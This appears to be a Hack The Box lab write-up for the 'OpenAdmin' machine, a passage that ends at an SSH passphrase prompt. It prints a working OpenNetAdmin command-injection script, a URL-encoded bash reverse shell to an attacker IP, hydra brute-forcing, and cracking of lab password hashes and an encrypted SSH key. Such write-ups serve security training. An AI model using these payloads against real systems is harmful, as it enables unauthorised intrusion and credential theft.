---
layout: single
title: OpenAdmin - Hack The Box
excerpt: "In this box we will be exploiting the OpenNetAdmin software, this is a system for tracking IP network attributes in a database, there are also several backend processes for building DHCP, DNS, router configuration, etc. We will get a reverse shell as the user www-data and gain access to the low privileged user jimmy thanks to credentials found in a database configuration file. Before getting root we will have to gain access to the user joanna and finally escalate privileges to root by abusing the nano binary."
date: 2021-08-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-openadmin/openadmin_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - opennetadmin
  - db creds
  - gtfobins
  - brute-force attack
---

![](/assets/images/htb-writeup-openadmin/openadmin_logo.png)

# Description

In this box we will be exploiting the OpenNetAdmin software, this is a system for tracking IP network attributes in a database, there are also several backend processes for building DHCP, DNS, router configuration, etc. We will get a reverse shell as the user www-data and gain access to the low privileged user jimmy thanks to credentials found in a database configuration file. Before getting root we will have to gain access to the user joanna and finally escalate privileges to root by abusing the nano binary.

# Recognition phase

Let's start with which ports are open via the TCP protocol.
```
nmap -p- --open -T5 -v -n 10.10.10.171 -oN allPorts

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
- -p- scan all ports.
- --open becouse I only want it to scan ports with open status, not filtered or closed.
- -T5 to indicate the speed, 5 is the maximum point, at the cost of going faster in scanning this calls much attention, but no problem because in Hack The Box we are in a controlled environment. 
- -v verbose.
- -n To indicate that we do not want DNS resolution to be applied, this makes the scanning go a little faster.

Now let's launch some basic enumeration scripts and see what services and version are running on those ports.
```
nmap -sC -sV -p22,80 10.10.10.171 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- -sC equivalent to --script=default, this will cause basic enumeration scripts to be launched.
- -sV to determine service/version info.

The SSH service version does not seem to have any critical vulnerability, so we start with enumerating port 80, we launch a whatweb to know more about the http service but not having relevant information to enumerate extensions, we launch a simple fuzz.

```
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/FUZZ
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.171/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

music                   [Status: 301, Size: 312, Words: 20, Lines: 10]
artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10]
sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [220560/220560] :: Job [1/1] :: 1220 req/sec :: Duration: [0:04:21] :: Errors: 0 ::
```
- -c for colorized output

# Web server recognition

Apache2 Ubuntu Default Page, there is nothing interesting in the source code.

![](/assets/images/htb-writeup-openadmin/apache-default.png)

### Let's see what ffuf found.

Exploring the three pages /music, /artwork and /sierra.

## http://10.10.10.171/music

![](/assets/images/htb-writeup-openadmin/music-page.png)

In the source code we do not find anything interesting, the other resources of the page only take us to some basic html templates, we also see that there is a potential registration >

![](/assets/images/htb-writeup-openadmin/ona-page.png)

We access the IP Address Management OpenNetAdmin as a guest user, looking for the default credentials of version 18.1.1 I found that they are admin:admin, we test them to discard default credentials and they work, we are logged in as administrator.

Here I paused before continuing with OpenNetAdmin to check the other pages that ffuf found but there is nothing interesting, only resources with html templates.

## http://10.10.10.171/artwork

![](/assets/images/htb-writeup-openadmin/artwork-page.png)

## http://10.10.10.171/sierra

![](/assets/images/htb-writeup-openadmin/sierra-page.png)

There doesn't seem to be anything interesting on those two pages, so let's move on to OpenNetAdmin.

### Search exploits for OpenNetAdmin v18.1.1

Searching a bit I found this script where apparently we get remote command execution.
```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}"
done
```
What the script does is a loop of reading the commands that we enter by console and then through curl send it as data through the POST method to the url that we enter (http://10.10.10.171/ona).

We already know what the script does, but we can do it manually by modifying the variables that it takes in line 6, basically we indicate manually the command that we want to execute remotely and the url.
```
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" "http://10.10.10.171/ona/"
```
- Something I would like to point out is that with curl it is always good practice to add a / at the end when indicating the URL.

![](/assets/images/htb-writeup-openadmin/rce-works.png)

Perfect! we have remote command execution, let's see if we can send us a reverse shell with bash URL encoding.

```
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F443%200%3E%261%22&xajaxargs[]=ping" "http://10.10.10.171/ona/"
```

```
nc -nlvp 443

listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.171] 56534
bash: cannot set terminal process group (1248): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ whoami
whoami
www-data
www-data@openadmin:/opt/ona/www$
```

- Reverse shell with bash URL encoding

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
``` 

Now let's make a treatment of the TTY.
```
script /dev/null -c bash
Ctrl+Z
stty raw -echo
fg

reset
xterm
export TERM=xterm-256color
export SHELL=bash
```

# Privilege escalation.

### First, let's see which of the existing users have a bash.
```
www-data@openadmin:/opt/ona/www$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

### A good practice that I recommend in cases like these where there was a web server with potential users, is to look for a database configuration file.

```
www-data@openadmin:/opt/ona/www$ grep -r -i passwd
plugins/ona_nmap_scans/install.php:        mysql -u {$self['db_login']} -p{$self['db_passwd']} {$self['db_database']} < {$sqlfile}</font><br><br>
include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
include/functions_db.inc.php:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
.htaccess.example:# You will need to create an .htpasswd file that conforms to the standard
.htaccess.example:# htaccess format, read the man page for htpasswd.  Change the 
.htaccess.example:# AuthUserFile option below as needed to reference your .htpasswd file.
.htaccess.example:# names, however, do need to be the same in both the .htpasswd and web
.htaccess.example:    #AuthUserFile /opt/ona/www/.htpasswd
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
winc/user_edit.inc.php:                    name="passwd"
winc/user_edit.inc.php:    if (!$form['id'] and !$form['passwd']) {
winc/user_edit.inc.php:    if ($form['passwd']) {
winc/user_edit.inc.php:        $form['passwd'] = md5($form['passwd']);
winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
winc/user_edit.inc.php:        if (strlen($form['passwd']) < 32) {
winc/user_edit.inc.php:            $form['passwd'] = $record['passwd'];
winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
winc/tooltips.inc.php://     Builds HTML for changing tacacs enable passwd
```
We found something very striking:
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!'

```
www-data@openadmin:/opt/ona/www$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

Let's dump the database
```
www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 27
Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)

mysql> use ona_default
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)

mysql> describe users;
+----------+------------------+------+-----+-------------------+-----------------------------+
| Field    | Type             | Null | Key | Default           | Extra                       |
+----------+------------------+------+-----+-------------------+-----------------------------+
| id       | int(10) unsigned | NO   | PRI | NULL              | auto_increment              |
| username | varchar(32)      | NO   | UNI | NULL              |                             |
| password | varchar(64)      | NO   |     | NULL              |                             |
| level    | int(4)           | NO   |     | 0                 |                             |
| ctime    | timestamp        | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
| atime    | datetime         | YES  |     | NULL              |                             |
+----------+------------------+------+-----+-------------------+-----------------------------+
6 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2021-08-22 14:37:31 | 2021-08-22 14:37:31 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
```

There are 2 users with passwords, let's try to unhash them to see if we can reuse them with any other user of the system.

[CrackStation](https://crackstation.net/)

098f6bcd4621d373cade4e832627b4f6:test
21232f297a57a5a743894a0e4a801fc3:admin

At this point, before continuing to list the system, let's try accessing a user with one of the three passwords we found. This could be done with hydra or medusa, then create two lists, one with the users who have a bash and the other with the three passwords found and start the attack.

```
cat users.txt                                                  
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: users.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ root
   2   │ jimmy
   3   │ joanna
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

cat pass.txt                  
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pass.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ test
   2   │ admin
   3   │ n1nj4W4rri0R!
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

Let's start the hydra.

```
hydra -L "users.txt" -P "pass.txt" -e nsr -s 22 ssh://10.10.10.171
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-22 17:27:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:3/p:6), ~2 tries per task
[DATA] attacking ssh://10.10.10.171:22/
[22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-22 17:27:58
```
- -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login.

Well done! we found a reused password for the user jimmy.

### After enumerating the system to find some way to escalate privileges I found three interesting things.

- I can't access to joanna directory. 

```
ls -la /home/
total 16
drwxr-xr-x  4 root   root   4096 Nov 22  2019 .
drwxr-xr-x 24 root   root   4096 Aug 17 13:12 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x---  5 joanna joanna 4096 Jul 27 06:12 joanna
```

- Checking the services that are listening I see that there is a high port open internally, that's why we couldn't see it in the nmap scan. Searching I didn't find anything specific for this port so I threw a curl to rule out that it is a web server.

```
curl 127.0.0.1:52846

<body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
                </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "/index.php" method = "post">
            <h4 class = "form-signin-heading"></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

</body>
```

- We found a potential web service that may be related to port 52846. ./var/www/internal/index.php

```
jimmy@openadmin:/$ find -type f -user jimmy -ls 2>/dev/null | grep -v "proc" 
      431      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/tasks
      441      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
      442      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
      440      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
      430      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
      936      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.threads
      961      0 -r--r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.events
      962      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.descendants
      965      0 -r--r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cpu.stat
      956      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.type
      964      0 -r--r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.stat
      958      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.threads
      959      0 -r--r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.controllers
      960      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.subtree_control
      963      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.depth
      938      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:06 ./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.subtree_control
     3576      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
     3578      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
     3581      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
     3582      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
     3583      0 -rw-r--r--   1 jimmy    jimmy           0 Aug 23 02:07 ./var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
   282830      4 -rwxrwxr-x   1 jimmy    internal      339 Nov 23  2019 ./var/www/internal/main.php
     2644      4 -rwxrwxr-x   1 jimmy    internal      185 Nov 23  2019 ./var/www/internal/logout.php
     1387      4 -rwxrwxr-x   1 jimmy    internal     3229 Nov 22  2019 ./var/www/internal/index.php
   394400      4 -rw-------   1 jimmy    jimmy           7 Nov 22  2019 ./home/jimmy/.local/share/nano/search_history
   394394      4 -rw-r--r--   1 jimmy    jimmy        3771 Apr  4  2018 ./home/jimmy/.bashrc
   393946      0 -rw-r--r--   1 jimmy    jimmy           0 Nov 21  2019 ./home/jimmy/.cache/motd.legal-displayed
   394395      4 -rw-r--r--   1 jimmy    jimmy         807 Apr  4  2018 ./home/jimmy/.profile
   394396      4 -rw-r--r--   1 jimmy    jimmy         220 Apr  4  2018 ./home/jimmy/.bash_logout
```

# Go to /var/www/internal

```
jimmy@openadmin:/$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```
A second web server, let's see what's there.

```
jimmy@openadmin:/$ cat index.php

<body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
```

```
jimmy@openadmin:/$ cat main.php 

<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

```
jimmy@openadmin:/$ cat logout.php 

<?php
   session_start();
   unset($_SESSION["username"]);
   unset($_SESSION["password"]);
   
   echo 'You have cleaned session';
   header('Refresh: 2; URL = index.php');
?>
```

Apparently it is a page with a login panel that when accessing executes the command cat /home/joanna/.ssh/id_rsa in the following line of the main.php: $output = shell_exec('cat /home/joanna/.ssh/id_rsa') 
The login validation has the password hashed in sha512 in the same main.php, if we crack it in [CrackStation](https://crackstation.net/) the result is "Revealed". I could do a port forwarding of the port that listens to the web page to show me the id_rsa of joanna, but being in the system as the user jimmy who is the owner, with a curl to the index.php and we could see the id_rsa.

```
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php

<pre>
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

In the line ````Proc-Type: 4,ENCRYPTED`` we see that this id_rsa is password protected, so in my system I will use ssh2john.py to get the password hash and then use john to break it if the password is weak.

```
root@kali:/# ./ssh2john.py id_rsa > hash-id_rsa

root@kali:/# cat hash-id_rsa

id_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c03
0982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a
10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f
0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d4096
3c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416
cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29
aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa544
1aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254a
df511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0
567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d1
4d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f9
1cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5
ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2
fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d
```

Now let's try to break it with John

```
root@kali:/# john --wordlist=/usr/share/wordlists/rockyou.txt hash-id_rsa
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
```

We have the password! set the permissions 600 to the id_rsa so that it does not give us problems when trying to authenticate. We access by ssh specifying the id_rsa with the parameter -i and we enter the password of the same one. The password it asks for is the same id_rsa that we had to break with john, it is not the joanna user's password.

```
root@kali:/# chmod 600 id_rsa

root@kali:/# ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa': 
